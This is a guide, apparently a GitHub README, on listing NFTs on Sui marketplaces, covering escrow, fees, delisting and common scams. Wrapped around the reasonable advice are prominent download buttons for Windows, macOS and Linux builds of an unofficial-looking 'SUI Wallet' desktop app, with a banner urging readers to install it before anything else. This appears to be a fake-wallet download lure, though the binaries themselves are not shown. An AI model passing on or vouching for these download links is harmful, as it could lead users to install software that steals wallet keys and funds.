![SUI Wallet](assets/banner-article.png)

# Listing an NFT on the Sui marketplace

A listing is a transaction that hands the object to a marketplace contract.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Listing happens on a marketplace, not in the wallet: the marketplace asks you to commit the object or approve
a transfer, and the wallet signs that request. Read what the listing actually does to the object before
approving, and check what the marketplace takes when it sells.

## What a listing is

A listing is a commitment. Depending on how the marketplace is built, it either takes the object into escrow
or records your agreement to transfer it at a price, and it does one of those with a transaction you sign.

That is why a listing is not a display preference. Between the approval and the sale, the object's state has
changed, and the wallet shows that change because the chain does.

## Reading the request

The wallet's preview names the object, the marketplace and the change. If the preview shows a transfer to an address you do not recognise, the listing is escrowing the piece rather than recording a price, and that distinction decides what you can do next.

Both patterns are legitimate and they are not the same thing. One means you cannot use the object until the
listing ends; the other leaves it in your account and transfers on sale.
[Approving transactions in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/approving-transactions-in-sui-wallet.md) covers the preview line by line, which is the skill this
article depends on.

The question to ask of the preview is where the object goes, not how much it costs. Cost is on the marketplace's page; custody is in the transaction.

## What the marketplace takes

A sale has a price, a marketplace fee and a network fee, and the seller receives the difference. Those are three separate numbers, and only the first is the one the listing page advertises in the largest type. Read the other two too.

Read the fee before listing rather than after selling. A marketplace that takes a large share is not dishonest
for doing so; it is only expensive if you did not notice.
The network fee is charged on the listing transaction as well as on the sale, so a listing is not free either.

## Delisting

Ending a listing early is another transaction, and on an escrowed listing it is the one that returns the object
to your account. A delisted listing that still shows as sold is a display lag rather than a second sale.

If a listing cannot be cancelled, the marketplace's terms explain why - some run for a fixed period. That is a
term to read before approving rather than a fault to report afterwards.

An escrowed listing that is cancelled in the marketplace and not in the wallet is the usual reason a piece appears to be in two places at once. The object list settles it.

## When the piece does not appear

Three ordinary causes: the marketplace is showing a different collection than the one your object belongs to, the object is already escrowed in an earlier listing, or the interface is older than the current release. The object list answers the second one.

Check the object list first, since escrow shows there as a change of owner rather than as a disappearance.
[Viewing NFTs in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/viewing-nfts-in-sui-wallet.md) covers what the list shows and why an empty screen is not proof of
anything.

An escrowed object still exists and still has an owner, so nothing is lost in the ordinary case. What changes is who can do anything with it until the listing ends.

## The scam shape to recognise

An offer that arrives as a message, a link or an object carrying instructions is not a listing. Real listings are transactions you initiate, and they appear in the wallet as a request with a preview you can read and decline.

The other shape is a "free mint" or "claim" page that asks you to approve a transfer of an existing piece to
prove ownership. Nothing needs to leave your account to prove you own it, and a request that says otherwise is
taking the piece.
[Sending NFTs from SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/sending-nfts-from-sui-wallet.md) covers what a transfer does once you have decided to make one.

## Where the projects sit

The marketplace and the cross-chain work live in the companion repositories described in the
[repository](https://github.com/sui-blockchain-wallet/sui-wallet-desktop), separate from the wallet itself.
The wallet's part in a listing is the signature and the preview, which is why the preview deserves the time.

That separation is the honest description of what a wallet is here: a signer and a preview, with the marketplace's terms arriving from the marketplace rather than from the application.

## FAQ

### Can I list an NFT from the wallet?

The wallet signs the listing transaction the marketplace builds. The listing itself belongs to the marketplace,
together with its fees and its terms.

### Where does the NFT go when I list it?

Either into the marketplace's escrow, which the preview shows as a transfer, or nowhere until it sells, if the
listing only records a price. Read the preview to know which.

### Can I cancel a listing?

Usually, as another transaction. Some marketplaces run listings for a fixed period, which is a term to read
before approving rather than a fault afterwards.

### What fees apply to a sale?

The marketplace's fee on the price, plus the network fee for the sale transaction. The seller receives the
price minus the first and pays the second separately.

### Why can I not find the NFT after listing it?

Because an escrowed object has changed owner, which shows in the object list rather than as a balance. Check
there before assuming it is gone.

### Is a DM offer to buy a listing safe?

Treat it as a stranger's message. A sale happens through a marketplace transaction you initiate, not through a
link somebody sends you.
